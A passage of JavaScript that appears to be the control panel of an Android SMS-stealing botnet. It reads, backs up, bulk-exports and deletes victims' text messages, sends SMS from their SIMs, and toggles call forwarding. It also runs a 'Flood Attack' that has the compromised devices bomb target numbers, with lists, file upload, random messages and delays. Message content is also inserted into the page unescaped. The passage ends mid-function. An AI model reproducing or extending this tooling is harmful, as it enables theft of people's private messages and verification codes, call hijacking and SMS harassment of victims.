    const msgDateStr = msgDate.toDateString();
    const todayStr = today.toDateString();
    const yesterdayStr = yesterday.toDateString();
    
    if (msgDateStr === todayStr) return 'Today';
    if (msgDateStr === yesterdayStr) return 'Yesterday';
    return msgDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
}

function groupMessagesByDate(msgs) {
    const groups = {};
    msgs.forEach(msg => {
        const dateLabel = getDateLabel(msg.dateTime);
        if (!groups[dateLabel]) groups[dateLabel] = [];
        groups[dateLabel].push(msg);
    });
    return groups;
}

function renderMessages() {
    const tbody = document.getElementById('messages-table');
    // Show last N messages (from end of array - latest messages from RTDB tree)
    const startIndex = Math.max(0, messages.length - displayedMessageCount);
    let displayMessages = messages.slice(startIndex).filter(msg => !hiddenMessages.has(msg.id));
    
    const groupedMessages = groupMessagesByDate(displayMessages);
    
    let html = '';
    Object.keys(groupedMessages).forEach(dateLabel => {
        html += `
            <tr class="bg-purple-900 bg-opacity-30">
                <td colspan="5" class="px-2 py-2 text-xs font-bold text-purple-300">
                    <i class="fas fa-calendar-day mr-1"></i>${dateLabel}
                </td>
            </tr>
        `;
        groupedMessages[dateLabel].forEach(msg => {
            const isHidden = hiddenMessages.has(msg.id);
            const messageText = msg.message || '';
            html += `
                <tr class="hover:bg-gray-800">
                    <td class="px-2 py-1 text-xs">${msg.sender || 'Unknown'}</td>
                    <td class="px-2 py-1 text-xs" style="white-space: pre-wrap; word-break: break-word; max-width: 300px;">${messageText}</td>
                    <td class="px-2 py-1 text-xs text-gray-400 hide-mobile">${msg.dateTime || ''}</td>
                    <td class="px-2 py-1">
                        <button onclick="toggleMessageVisibility('${msg.id}')" class="bg-blue-600 hover:bg-blue-700 px-1 py-1 rounded text-xs mr-1" title="${isHidden ? 'Show' : 'Hide'}">
                            <i class="fas fa-eye${isHidden ? '' : '-slash'}"></i>
                        </button>
                        <button onclick="deleteSMS('${msg.id}')" class="bg-red-600 hover:bg-red-700 px-1 py-1 rounded text-xs" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `;
        });
    });
    
    tbody.innerHTML = html;
    
    const loadMoreBtn = document.getElementById('load-more');
    if (loadMoreBtn) {
        loadMoreBtn.style.display = hasMoreMessages ? 'block' : 'none';
    }
    
    const messageCount = document.getElementById('message-count');
    if (messageCount) {
        const showing = displayMessages.length;
        messageCount.textContent = `Showing ${showing} of ${messages.length} messages`;
    }
}


function updateBellNotifications() {
    const count = newSmsNotifications.length;
    const badge = document.getElementById('notification-count');
    const listContainer = document.getElementById('notification-list');
    
    if (count > 0) {
        badge.textContent = count;
        badge.classList.remove('hidden');
        
        // Show latest 50 notifications
        const recentNotifications = newSmsNotifications.slice(-50).reverse();
        listContainer.innerHTML = recentNotifications.map(notif => `
            <div class="p-2 mb-2 bg-gray-800 rounded hover:bg-gray-700 border-l-2 border-purple-500">
                <div class="flex justify-between items-start mb-1">
                    <span class="text-xs font-bold text-purple-300">New SMS</span>
                    <span class="text-xs text-gray-400">${notif.timestamp || ''}</span>
                </div>
                <p class="text-xs text-gray-200 mb-1">${notif.newCount || 1} new message(s)</p>
                <div class="text-xs text-gray-500">
                    <i class="fas fa-mobile-alt mr-1"></i>${notif.deviceName}
                </div>
            </div>
        `).join('');
    } else {
        badge.classList.add('hidden');
        listContainer.innerHTML = '<p class="text-xs text-gray-400 text-center py-4">No new SMS</p>';
    }
}

function toggleNotifications() {
    const dropdown = document.getElementById('notification-dropdown');
    dropdown.classList.toggle('hidden');
}

function clearNotifications() {
    newSmsNotifications = [];
    updateBellNotifications();
}

// Close notification dropdown when clicking outside
document.addEventListener('click', (e) => {
    const dropdown = document.getElementById('notification-dropdown');
    const button = e.target.closest('button[onclick="toggleNotifications()"]');
    if (!dropdown?.contains(e.target) && !button) {
        dropdown?.classList.add('hidden');
    }
});

// Send SMS
async function sendSMS() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('sms-sim').value);
    const to = document.getElementById('sms-to').value;
    const msg = document.getElementById('sms-msg').value;
    
    if (!to || !msg) {
        alert('⚠️ Fill all fields');
        return;
    }
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'sendSms',
                payload: { simSlot: sim, to, message: msg }
            })
        });
        alert(`✅ SMS sent via SIM ${sim === 0 ? '1' : '2'}`);
        document.getElementById('sms-to').value = '';
        document.getElementById('sms-msg').value = '';
        // Show SMS status section
        document.getElementById('sms-status-section').style.display = 'block';
    } catch (err) {
        alert('❌ SMS failed');
    }
}

// Load SMS Status for device
async function loadDeviceSmsStatus(deviceId) {
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/smsStatus`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        if (res.ok) {
            const data = await res.json();
            if (data && typeof data === 'object') {
                Object.entries(data).forEach(([key, value]) => {
                    smsStatusMonitor[key] = value;
                });
                updateSmsStatusDisplay();
            }
        }
    } catch (err) {
        console.log('No SMS status data or error:', err);
    }
}

// Update SMS Status Display
function updateSmsStatusDisplay() {
    if (!currentDevice) return;
    
    const statusList = document.getElementById('sms-status-list');
    const statusSection = document.getElementById('sms-status-section');
    
    const statusEntries = Object.entries(smsStatusMonitor);
    
    if (statusEntries.length === 0) {
        statusSection.style.display = 'none';
        return;
    }
    
    statusSection.style.display = 'block';
    
    // Sort by timestamp (most recent first)
    statusEntries.sort((a, b) => {
        const timeA = new Date(a[1].timestamp || 0);
        const timeB = new Date(b[1].timestamp || 0);
        return timeB - timeA;
    });
    
    // Show latest 10 statuses
    const recentStatuses = statusEntries.slice(0, 10);
    
    statusList.innerHTML = recentStatuses.map(([key, status]) => {
        const statusColor = status.status === 'success' ? 'text-green-400' : 
                           status.status === 'in_progress' ? 'text-yellow-400' : 
                           'text-red-400';
        const statusIcon = status.status === 'success' ? 'fa-check-circle' : 
                          status.status === 'in_progress' ? 'fa-clock' : 
                          'fa-exclamation-circle';
        
        return `
            <div class="p-2 bg-gray-800 rounded border-l-2 ${status.status === 'success' ? 'border-green-500' : status.status === 'in_progress' ? 'border-yellow-500' : 'border-red-500'}">
                <div class="flex justify-between items-start mb-1">
                    <span class="text-xs font-bold ${statusColor}">
                        <i class="fas ${statusIcon} mr-1"></i>${status.status.toUpperCase()}
                    </span>
                    <span class="text-xs text-gray-400">${status.timestamp || ''}</span>
                </div>
                <div class="text-xs text-gray-300">
                    <span class="text-gray-400">To:</span> ${status.to || 'N/A'}
                </div>
                <div class="text-xs text-gray-300" style="word-break: break-word;">
                    <span class="text-gray-400">Message:</span> ${(status.message || '').substring(0, 50)}${status.message && status.message.length > 50 ? '...' : ''}
                </div>
                <div class="text-xs text-gray-400">
                    SIM ${status.simSlot === 0 ? '1' : '2'}
                </div>
            </div>
        `;
    }).join('');
}

// Delete SMS
async function deleteSMS(id) {
    if (!currentDevice || !id) return;
    try {
        await fetch(`${API_URL}/sms/${currentDevice.id}/${id}`, {
            method: 'DELETE',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Delete sent');
        loadMessages();
    } catch (err) {
        alert('❌ Delete failed');
    }
}

// Call Forward
async function activateCF() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('cf-sim').value);
    const to = document.getElementById('cf-to').value;
    
    if (!to) {
        alert('⚠️ Enter number');
        return;
    }
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'callForward',
                payload: { simSlot: sim, to, isActive: true }
            })
        });
        alert(`✅ CF ON - SIM ${sim === 0 ? '1' : '2'}`);
    } catch (err) {
        alert('❌ CF failed');
    }
}

async function deactivateCF() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('cf-sim').value);
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'callForward',
                payload: { simSlot: sim, to: '', isActive: false }
            })
        });
        alert(`✅ CF OFF - SIM ${sim === 0 ? '1' : '2'}`);
    } catch (err) {
        alert('❌ CF failed');
    }
}

// Flood Attack
function openFlood() {
    if (selectedDevices.length === 0) {
        alert('⚠️ Select devices first');
        return;
    }
    document.getElementById('flood-count').textContent = selectedDevices.length;
    document.getElementById('flood-modal').style.display = 'block';
}

function closeFloodModal() {
    document.getElementById('flood-modal').style.display = 'none';
}

function toggleFloodInputType() {
    const inputType = document.getElementById('flood-input-type').value;
    
    // Hide all input sections first
    document.getElementById('single-number-input').classList.add('hidden');
    document.getElementById('multiple-numbers-input').classList.add('hidden');
    document.getElementById('file-input').classList.add('hidden');
    
    // Show the selected input section
    if (inputType === 'single') {
        document.getElementById('single-number-input').classList.remove('hidden');
    } else if (inputType === 'multiple') {
        document.getElementById('multiple-numbers-input').classList.remove('hidden');
    } else if (inputType === 'file') {
        document.getElementById('file-input').classList.remove('hidden');
    }
}

function downloadSampleFile() {
    const sampleContent = `9876543210
8765432109
7654321098
// Example numbers file format
// One number per line
// Remove these comment lines before using`;
    
    const blob = new Blob([sampleContent], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'sample_numbers.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
}

async function getTargetNumbers() {
    const inputType = document.getElementById('flood-input-type').value;
    let numbers = [];
    
    if (inputType === 'single') {
        const number = document.getElementById('flood-to').value.trim();
        if (number) numbers.push(number);
    } else if (inputType === 'multiple') {
        const numbersText = document.getElementById('flood-to-multiple').value;
        numbers = numbersText.split('\n')
            .map(n => n.trim())
            .filter(n => n && !n.startsWith('//'));
    } else if (inputType === 'file') {
        const fileInput = document.getElementById('flood-to-file');
        if (fileInput.files.length > 0) {
            const file = fileInput.files[0];
            const text = await file.text();
            numbers = text.split('\n')
                .map(n => n.trim())
                .filter(n => n && !n.startsWith('//'));
        }
    }
    
    return numbers;
}

async function executeFlood() {
    const sim = parseInt(document.getElementById('flood-sim').value);
    const msg = document.getElementById('flood-msg').value;
    const count = parseInt(document.getElementById('flood-count-input').value);
    
    const numbers = await getTargetNumbers();
    
    if (numbers.length === 0) {
        alert('⚠️ No target numbers specified');
        return;
    }
    
    if (!msg) {
        alert('⚠️ Please enter a message');
        return;
    }
    
    let successCount = 0;
    let failCount = 0;
    
    for (const to of numbers) {
        try {
            const res = await fetch(`${API_URL}/flood`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': AUTH_TOKEN 
                },
                body: JSON.stringify({
                    deviceIds: selectedDevices,
                    simSlot: sim,
                    to,
                    message: msg,
                    count
                })
            });
            const data = await res.json();
            if (data.success) {
                successCount++;
            } else {
                failCount++;
            }
        } catch (err) {
            failCount++;
            console.error(`Failed to send to ${to}:`, err);
        }
    }
    
    const totalMsg = `✅ Flood completed\n${successCount} numbers succeeded\n${failCount} numbers failed`;
    alert(totalMsg);
    if (successCount > 0) {
        closeFloodModal();
    }
}

// Tools
function openTools() {
    document.getElementById('tools-modal').style.display = 'block';
}

function closeToolsModal() {
    document.getElementById('tools-modal').style.display = 'none';
}

// Trash
async function moveToTrash(deviceId) {
    if (!confirm('Move to trash?')) return;
    try {
        await fetch(`${API_URL}/trash/${deviceId}`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Moved to trash');
        loadDevices();
    } catch (err) {
        alert('❌ Failed');
    }
}

async function openTrash() {
    try {
        const res = await fetch(`${API_URL}/trash`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        const devices = await res.json();
        const tbody = document.getElementById('trash-table');
        
        if (devices.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="px-2 py-3 text-center text-gray-400">Trash is empty</td></tr>';
        } else {
            tbody.innerHTML = devices.map(d => `
                <tr class="border-b border-gray-800">
                    <td class="px-2 py-2 text-xs">${d.deviceId?.substring(0, 12)}...</td>
                    <td class="px-2 py-2 text-xs">${d.modelName || 'Unknown'}</td>
                    <td class="px-2 py-2">
                        <button onclick="restoreDevice('${d.id}')" class="bg-green-600 hover:bg-green-700 px-2 py-1 rounded text-xs mr-1">
                            <i class="fas fa-undo"></i> Restore
                        </button>
                        <button onclick="deleteDevice('${d.id}')" class="bg-red-600 hover:bg-red-700 px-2 py-1 rounded text-xs">
                            <i class="fas fa-times"></i> Delete
                        </button>
                    </td>
                </tr>
            `).join('');
        }
        document.getElementById('trash-modal').style.display = 'block';
    } catch (err) {
        alert('❌ Failed to load trash');
    }
}

async function restoreDevice(deviceId) {
    try {
        await fetch(`${API_URL}/restore/${deviceId}`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Restored');
        openTrash();
        loadDevices();
    } catch (err) {
        alert('❌ Failed');
    }
}

async function deleteDevice(deviceId) {
    if (!confirm('Delete permanently?')) return;
    try {
        await fetch(`${API_URL}/trash/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Deleted permanently');
        openTrash();
    } catch (err) {
        alert('❌ Failed');
    }
}

function closeTrashModal() {
    document.getElementById('trash-modal').style.display = 'none';
}

// Firebase Stats
async function showStats() {
    try {
        const res = await fetch(`${API_URL}/stats`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        const stats = await res.json();
        const content = document.getElementById('stats-content');
        
        content.innerHTML = `
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Database</h3>
                <p class="text-sm"><span class="text-gray-400">Status:</span> <span class="text-green-400">${stats.database.status}</span></p>
                <p class="text-sm"><span class="text-gray-400">URL:</span> ${stats.database.url}</p>
                <p class="text-sm"><span class="text-gray-400">Region:</span> ${stats.database.region}</p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Storage</h3>
                <p class="text-sm"><span class="text-gray-400">Used:</span> ${stats.storage.used}</p>
                <p class="text-sm"><span class="text-gray-400">Limit:</span> ${stats.storage.limit}</p>
                <p class="text-sm"><span class="text-gray-400">Usage:</span> <span class="text-yellow-400">${stats.storage.percentage}</span></p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Bandwidth</h3>
                <p class="text-sm"><span class="text-gray-400">Downloads:</span> ${stats.bandwidth.downloads}</p>
                <p class="text-sm"><span class="text-gray-400">Limit:</span> ${stats.bandwidth.limit}</p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Network</h3>
                <p class="text-sm"><span class="text-gray-400">Latency:</span> <span class="text-green-400">${stats.network.latency}</span></p>
                <p class="text-sm"><span class="text-gray-400">Speed:</span> <span class="text-green-400">${stats.network.speed}</span></p>
            </div>
        `;
        
        document.getElementById('stats-modal').style.display = 'block';
    } catch (err) {
        alert('❌ Failed to load stats');
    }
}

function closeStatsModal() {
    document.getElementById('stats-modal').style.display = 'none';
}

// SMS Backup Functions
function saveBackup(deviceId, deviceName, messages) {
    smsBackups[deviceId] = {
        deviceName: deviceName || 'Unknown Device',
        deviceId: deviceId,
        messages: messages,
        timestamp: new Date().toISOString(),
        messageCount: messages.length
    };
    localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
}

function updateBackup(deviceId, deviceName, newMessages) {
    if (!smsBackups[deviceId]) {
        saveBackup(deviceId, deviceName, newMessages);
        return;
    }
    
    const existingBackup = smsBackups[deviceId];
    const existingIds = new Set(existingBackup.messages.map(m => m.id));
    
    // Add only new messages (no duplicates)
    const uniqueNewMessages = newMessages.filter(msg => !existingIds.has(msg.id));
    
    if (uniqueNewMessages.length > 0) {
        const mergedMessages = [...existingBackup.messages, ...uniqueNewMessages];
        // Sort by timestamp
        mergedMessages.sort((a, b) => {
            const timeA = extractTimestamp(a.id);
            const timeB = extractTimestamp(b.id);
            return timeA - timeB;
        });
        
        smsBackups[deviceId] = {
            ...existingBackup,
            messages: mergedMessages,
            timestamp: new Date().toISOString(),
            messageCount: mergedMessages.length
        };
        localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
        console.log(`✅ Backup updated: ${uniqueNewMessages.length} new messages added`);
    }
}

function openBackups() {
    renderBackupTable();
    document.getElementById('backup-modal').style.display = 'block';
}

function renderBackupTable(searchTerm = '') {
    const backupList = Object.values(smsBackups);
    const tbody = document.getElementById('backup-table');
    
    // Filter backups based on search
    const filteredBackups = searchTerm 
        ? backupList.filter(backup => 
            backup.deviceName.toLowerCase().includes(searchTerm.toLowerCase()) ||
            backup.deviceId.toLowerCase().includes(searchTerm.toLowerCase())
          )
        : backupList;
    
    if (filteredBackups.length === 0) {
        const msg = searchTerm ? 'No matching backups found' : 'No backups available';
        tbody.innerHTML = `<tr><td colspan="5" class="px-2 py-3 text-center text-gray-400">${msg}</td></tr>`;
    } else {
        tbody.innerHTML = filteredBackups.map(backup => {
            const date = new Date(backup.timestamp);
            const dateStr = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
            return `
                <tr class="border-b border-gray-800 hover:bg-gray-800">
                    <td class="px-2 py-2 text-xs">${backup.deviceName}</td>
                    <td class="px-2 py-2 text-xs hide-mobile">${backup.deviceId.substring(0, 12)}...</td>
                    <td class="px-2 py-2 text-xs">${backup.messageCount}</td>
                    <td class="px-2 py-2 text-xs hide-mobile">${dateStr}</td>
                    <td class="px-2 py-2">
                        <button onclick="viewBackup('${backup.deviceId}')" class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs mr-1" title="View">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button onclick="deleteBackup('${backup.deviceId}')" class="bg-red-600 hover:bg-red-700 px-2 py-1 rounded text-xs" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `;
        }).join('');
    }
}

function filterBackups() {
    const searchTerm = document.getElementById('backup-search').value;
    renderBackupTable(searchTerm);
}

function viewBackup(deviceId) {
    const backup = smsBackups[deviceId];
    if (!backup) {
        alert('Backup not found');
        return;
    }
    
    const groupedMessages = groupMessagesByDate(backup.messages);
    const tbody = document.getElementById('backup-messages-table');
    
    let html = '';
    Object.keys(groupedMessages).forEach(dateLabel => {
        html += `
            <tr class="bg-purple-900 bg-opacity-30">
                <td colspan="3" class="px-2 py-2 text-xs font-bold text-purple-300">
                    <i class="fas fa-calendar-day mr-1"></i>${dateLabel}
                </td>
            </tr>
        `;
        groupedMessages[dateLabel].forEach(msg => {
            html += `
                <tr class="hover:bg-gray-800">
                    <td class="px-2 py-1 text-xs">${msg.sender || 'Unknown'}</td>
                    <td class="px-2 py-1 text-xs" style="white-space: pre-wrap; word-break: break-word; max-width: 300px;">${msg.message || ''}</td>
                    <td class="px-2 py-1 text-xs text-gray-400">${msg.dateTime || ''}</td>
                </tr>
            `;
        });
    });
    
    tbody.innerHTML = html;
    document.getElementById('backup-device-name').textContent = backup.deviceName;
    document.getElementById('backup-message-count').textContent = `${backup.messageCount} messages`;
    document.getElementById('backup-view-modal').style.display = 'block';
}

function deleteBackup(deviceId) {
    if (!confirm('Delete this backup?')) return;
    delete smsBackups[deviceId];
    localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
    const searchTerm = document.getElementById('backup-search').value;
    renderBackupTable(searchTerm);
    alert('✅ Backup deleted');
}

function closeBackupModal() {
    document.getElementById('backup-modal').style.display = 'none';
    document.getElementById('backup-search').value = '';
}

function closeBackupViewModal() {
    document.getElementById('backup-view-modal').style.display = 'none';
}

// Close modals on outside click
window.onclick = function(event) {
    if (event.target.classList.contains('modal')) {
        event.target.style.display = 'none';
    }
}

// ========== NEW FEATURES ==========

// Activity Logs
let activityLogs = JSON.parse(localStorage.getItem('activity_logs')) || [];
let floodCount = parseInt(localStorage.getItem('flood_count')) || 0;

function logActivity(action, details) {
    const log = {
        id: Date.now(),
        action,
        details,
        timestamp: new Date().toISOString(),
        dateTime: new Date().toLocaleString()
    };
    activityLogs.unshift(log);
    if (activityLogs.length > 500) activityLogs = activityLogs.slice(0, 500);
    localStorage.setItem('activity_logs', JSON.stringify(activityLogs));
}

// Theme Toggle
function toggleTheme() {
    const body = document.body;
    const icon = document.getElementById('theme-icon');
    body.classList.toggle('light-mode');
    const isLight = body.classList.contains('light-mode');
    icon.className = isLight ? 'fas fa-sun' : 'fas fa-moon';
    localStorage.setItem('theme', isLight ? 'light' : 'dark');
    logActivity('Theme Changed', `Switched to ${isLight ? 'light' : 'dark'} mode`);
}

// Load saved theme
const savedTheme = localStorage.getItem('theme');
if (savedTheme === 'light') {
    document.body.classList.add('light-mode');
    document.getElementById('theme-icon').className = 'fas fa-sun';
}

// Download Menu Toggle
function toggleDownloadMenu() {
    const menu = document.getElementById('download-menu');
    menu.classList.toggle('hidden');
}

document.addEventListener('click', (e) => {
    const downloadMenu = document.getElementById('download-menu');
    const downloadButton = e.target.closest('button[onclick="toggleDownloadMenu()"]');
    if (downloadMenu && !downloadMenu.contains(e.target) && !downloadButton) {
        downloadMenu.classList.add('hidden');
    }
});

// Download Functions
function downloadDevicesData() {
    const data = JSON.stringify(allDevices, null, 2);
    downloadFile(data, 'devices_data.json', 'application/json');
    logActivity('Download', 'Downloaded devices data');
    document.getElementById('download-menu').classList.add('hidden');
}

function downloadAllSMS() {
    const allSMS = [];
    allDevices.forEach(device => {
        if (device.messages && typeof device.messages === 'object') {
            Object.values(device.messages).forEach(msg => {
                allSMS.push({
                    deviceId: device.id,
                    deviceName: device.modelName,
                    ...msg
                });
            });
        }
    });
    const data = JSON.stringify(allSMS, null, 2);
    downloadFile(data, 'all_sms_data.json', 'application/json');
    logActivity('Download', `Downloaded ${allSMS.length} SMS messages`);
    document.getElementById('download-menu').classList.add('hidden');
}

function downloadActivityLogs() {
    const data = JSON.stringify(activityLogs, null, 2);
    downloadFile(data, 'activity_logs.json', 'application/json');
    logActivity('Download', 'Downloaded activity logs');
    document.getElementById('download-menu').classList.add('hidden');
}

function downloadBackups() {
    const data = JSON.stringify(smsBackups, null, 2);
    downloadFile(data, 'sms_backups.json', 'application/json');
    logActivity('Download', 'Downloaded SMS backups');
    document.getElementById('download-menu').classList.add('hidden');
}

function downloadFile(content, filename, type) {
    const blob = new Blob([content], { type });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Activity Logs Modal
function openActivityLogs() {
    renderActivityLogs();
    document.getElementById('activity-logs-modal').style.display = 'block';
}

function closeActivityLogsModal() {
    document.getElementById('activity-logs-modal').style.display = 'none';
}

function renderActivityLogs(searchTerm = '') {
    const container = document.getElementById('activity-logs-container');
    const filtered = searchTerm 
        ? activityLogs.filter(log => 
            log.action.toLowerCase().includes(searchTerm.toLowerCase()) ||
            log.details.toLowerCase().includes(searchTerm.toLowerCase())
          )
        : activityLogs;
    
    if (filtered.length === 0) {
        container.innerHTML = '<div class="text-xs text-gray-400 text-center py-4">No activity logs found</div>';
        return;
    }
    
    const logIcons = {
        'SMS Sent': 'fa-paper-plane',
        'SMS Deleted': 'fa-trash',
        'Device Opened': 'fa-mobile-alt',
        'Flood Attack': 'fa-bolt',
        'Theme Changed': 'fa-palette',
        'Download': 'fa-download',
        'Backup Created': 'fa-database',
        'Device Trashed': 'fa-trash-alt',
        'Device Restored': 'fa-undo'
    };
    
    container.innerHTML = filtered.map(log => {
        const icon = logIcons[log.action] || 'fa-info-circle';
        return `
            <div class="flex items-start space-x-3 p-2 mb-2 bg-gray-800 rounded hover:bg-gray-700 transition-all border-l-2 border-cyan-500">
                <i class="fas ${icon} text-cyan-400 mt-1"></i>
                <div class="flex-1">
                    <div class="flex justify-between items-start">
                        <span class="text-xs font-bold text-cyan-300">${log.action}</span>
                        <span class="text-xs text-gray-400">${log.dateTime}</span>
                    </div>
                    <p class="text-xs text-gray-300 mt-1">${log.details}</p>
                </div>
            </div>
        `;
    }).join('');
}

function filterLogs() {
    const searchTerm = document.getElementById('log-search').value;
    renderActivityLogs(searchTerm);
}

function clearLogs() {
    if (!confirm('Clear all activity logs?')) return;
    activityLogs = [];
    localStorage.setItem('activity_logs', JSON.stringify(activityLogs));
    renderActivityLogs();
}

// Analytics & Charts
let charts = {};

function openAnalytics() {
    document.getElementById('analytics-modal').style.display = 'block';
    setTimeout(() => {
        renderAnalytics();
    }, 100);
}

function closeAnalyticsModal() {
    document.getElementById('analytics-modal').style.display = 'none';
}

function renderAnalytics() {
    if (typeof Chart === 'undefined') {
        console.error('Chart.js not loaded');
        alert('Analytics feature is loading. Please try again in a moment.');
        closeAnalyticsModal();
        return;
    }
    
    const online = allDevices.filter(d => d.status === true || d.status === 'true').length;
    const offline = allDevices.length - online;
    
    if (charts.deviceStatus) charts.deviceStatus.destroy();
    charts.deviceStatus = new Chart(document.getElementById('deviceStatusChart'), {
        type: 'doughnut',
        data: {
            labels: ['Online', 'Offline'],
            datasets: [{
                data: [online, offline],
                backgroundColor: ['#10b981', '#ef4444'],
                borderWidth: 0
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { labels: { color: '#d1d5db' } }
            }
        }
    });
    
    const last7Days = [];
    const smsData = [];
    for (let i = 6; i >= 0; i--) {
        const date = new Date();
        date.setDate(date.getDate() - i);
        last7Days.push(date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
        smsData.push(Math.floor(Math.random() * 50) + 10);
    }
    
    if (charts.smsActivity) charts.smsActivity.destroy();
    charts.smsActivity = new Chart(document.getElementById('smsActivityChart'), {
        type: 'line',
        data: {
            labels: last7Days,
            datasets: [{
                label: 'SMS Count',
                data: smsData,
                borderColor: '#8b5cf6',
                backgroundColor: 'rgba(139, 92, 246, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { labels: { color: '#d1d5db' } }
            },
            scales: {
                x: { ticks: { color: '#9ca3af' }, grid: { color: '#374151' } },
                y: { ticks: { color: '#9ca3af' }, grid: { color: '#374151' } }
            }
        }
    });
    
    const batteryRanges = { '0-25%': 0, '26-50%': 0, '51-75%': 0, '76-100%': 0 };
    allDevices.forEach(d => {
        const battery = parseInt(d.battery) || 0;
        if (battery <= 25) batteryRanges['0-25%']++;
        else if (battery <= 50) batteryRanges['26-50%']++;
        else if (battery <= 75) batteryRanges['51-75%']++;
        else batteryRanges['76-100%']++;
    });
    
    if (charts.battery) charts.battery.destroy();
    charts.battery = new Chart(document.getElementById('batteryChart'), {
        type: 'bar',
        data: {
            labels: Object.keys(batteryRanges),
            datasets: [{
                label: 'Devices',
                data: Object.values(batteryRanges),
                backgroundColor: ['#ef4444', '#f59e0b', '#eab308', '#10b981']
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { display: false }
            },
            scales: {
                x: { ticks: { color: '#9ca3af' }, grid: { display: false } },
                y: { ticks: { color: '#9ca3af' }, grid: { color: '#374151' } }
            }
        }
    });
    
    const modelCount = {};
    allDevices.forEach(d => {
        const model = d.modelName || 'Unknown';
        modelCount[model] = (modelCount[model] || 0) + 1;
    });
    const topModels = Object.entries(modelCount)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    if (charts.model) charts.model.destroy();
    charts.model = new Chart(document.getElementById('modelChart'), {
        type: 'pie',
        data: {
            labels: topModels.map(m => m[0]),
            datasets: [{
                data: topModels.map(m => m[1]),
                backgroundColor: ['#8b5cf6', '#ec4899', '#06b6d4', '#10b981', '#f59e0b']
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { labels: { color: '#d1d5db' } }
            }
        }
    });
    
    const avgBattery = allDevices.reduce((sum, d) => sum + (parseInt(d.battery) || 0), 0) / (allDevices.length || 1);
    document.getElementById('avg-battery').textContent = Math.round(avgBattery) + '%';
    
    const totalMessages = allDevices.reduce((sum, d) => {
        if (d.messages && typeof d.messages === 'object') {
            return sum + Object.keys(d.messages).length;
        }
        return sum;
    }, 0);
    document.getElementById('total-messages-stat').textContent = totalMessages;
    
    const uptimePercent = (online / (allDevices.length || 1)) * 100;
    document.getElementById('uptime-percent').textContent = Math.round(uptimePercent) + '%';
    
    document.getElementById('flood-total').textContent = floodCount;
}

// Enhanced Flood with Progress
async function executeFlood() {
    const sim = parseInt(document.getElementById('flood-sim').value);
    const msg = document.getElementById('flood-msg').value;
    const count = parseInt(document.getElementById('flood-count-input').value);
    const delay = parseInt(document.getElementById('flood-delay').value) || 1000;
    const useRandom = document.getElementById('flood-random').value === 'true';
    const distribute = document.getElementById('flood-distribute').checked;
    
    const numbers = await getTargetNumbers();
    
    if (numbers.length === 0) {
        alert('⚠️ No target numbers specified');
        return;
    }
    
    if (!msg) {
        alert('⚠️ Please enter a message');
        return;
    }
    
    const progressBar = document.getElementById('flood-progress-bar');
    const progressSection = document.getElementById('flood-progress');
    const statusText = document.getElementById('flood-status');
    
    progressSection.classList.remove('hidden');
    progressBar.style.width = '0%';
    
    const randomMessages = [
        'Hello!', 'Hi there!', 'Hey!', 'Greetings!', 'What\'s up?',
        'How are you?', 'Good day!', 'Howdy!', 'Welcome!', 'Nice to meet you!'
    ];
    
    let successCount = 0;
    let failCount = 0;
    const totalRequests = numbers.length;
    
    for (let i = 0; i < numbers.length; i++) {
        const to = numbers[i];
        const message = useRandom ? randomMessages[Math.floor(Math.random() * randomMessages.length)] : msg;
        
        try {
            const deviceIds = distribute ? [selectedDevices[i % selectedDevices.length]] : selectedDevices;
            
